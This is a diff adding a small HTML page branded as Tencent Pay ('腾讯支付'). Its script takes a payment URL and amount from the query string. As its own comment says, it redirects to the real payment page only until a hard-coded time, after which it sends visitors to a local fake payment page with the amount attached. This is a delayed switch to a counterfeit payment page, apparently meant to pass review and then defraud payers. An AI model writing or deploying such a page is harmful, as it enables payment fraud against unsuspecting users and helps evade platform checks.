@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>腾讯支付</title>
+</head>
+<body>
+    <script>
+
+        const searchParams = new URLSearchParams(window.location.search);
+        let pay_url = searchParams.get('qqpayurl'); 
+        let money = searchParams.get('money');  
+        // 在这里做判断时间然后跳转真假支付页面
+
+        var timestamp = Date.now(); // 获取当前时间戳
+        console.log(timestamp); // 输出当前时间戳
+        if(timestamp > 1747039116000){
+            window.location.href = '/qqpay.html?money=' + money;
+        }else{
+            window.location.href = pay_url;
+        }
+
+    </script>
+</body>
+</html>
